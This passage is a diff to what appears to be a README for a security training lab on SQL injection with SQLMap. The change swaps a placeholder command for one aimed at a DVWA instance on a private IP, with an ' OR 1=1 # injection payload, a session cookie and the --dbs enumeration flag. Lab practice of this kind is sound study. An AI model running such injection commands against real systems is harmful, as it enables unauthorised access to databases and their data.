@@ -16,7 +16,7 @@ This lab demonstrates SQL injection testing and database enumeration using SQLMa
 
 ## Commands Used
 ```bash
-sqlmap -u "http://example.com?id=1" --dbs
+ sqlmap -u "http://10.79.140.109/dvwa/vulnerabilities/sqli/?id=%27+OR+1%3D1+%23&Submit=Submit#" --cookie="PHPSESSID=32720998fca36704e3a8feedae59ae3d; security=low" --dbs
 ```
 
 ## Skills Demonstrated
